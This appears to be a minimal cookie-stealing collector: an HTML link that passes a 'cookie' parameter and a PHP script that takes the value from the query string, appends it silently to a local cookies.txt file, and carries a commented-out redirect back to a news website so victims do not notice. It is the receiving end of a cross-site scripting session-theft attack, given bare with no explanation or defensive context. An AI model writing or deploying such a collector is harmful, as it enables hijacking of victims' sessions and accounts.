<a href="#?cookies.php?cookie=maruf"> Click Here </a>
<?php

$cookie = $_GET['cookie'];

$info = "$cookie\n\n";

$fh = @fopen("cookies.txt", "a");
@fwrite($fh, $info);

// Return to original site
// header("Location: https://www.prothomalo.com/");
?>
